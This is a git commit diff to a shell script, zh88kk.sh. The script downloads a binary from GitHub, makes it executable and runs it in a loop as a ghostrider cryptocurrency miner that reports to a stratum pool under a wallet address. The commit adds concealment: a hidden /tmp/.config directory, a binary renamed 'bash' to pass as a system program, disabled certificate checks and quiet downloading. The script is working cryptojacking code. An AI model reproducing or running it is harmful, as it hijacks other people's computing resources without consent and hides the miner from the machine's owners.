8079d76651c0697eed0fd1d17a82700d0405bf4e
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-04 11:48:43 +0800

    Update zh88kk.sh

--- zh88kk.sh
+++ zh88kk.sh
@@ -1,12 +1,12 @@
 #!/bin/bash
 
-mkdir -p /tmp/c3
-cd /tmp/c3
-wget https://raw.githubusercontent.com/Blenkinship/any/main/sleep
-chmod -R  777 /tmp/c3
+mkdir -p /tmp/.config
+cd /tmp/.config
+wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/curiosityinteriorsuk/2088/raw/main/b"
+chmod -R  777 /tmp/.config
 
 #!/bin/sh
 while [ 1 ]; do
-	/tmp/c3/sleep -a ghostrider --url stratum+tcp://asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2088 --pass 5566
+	/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088
 	sleep 5
 done
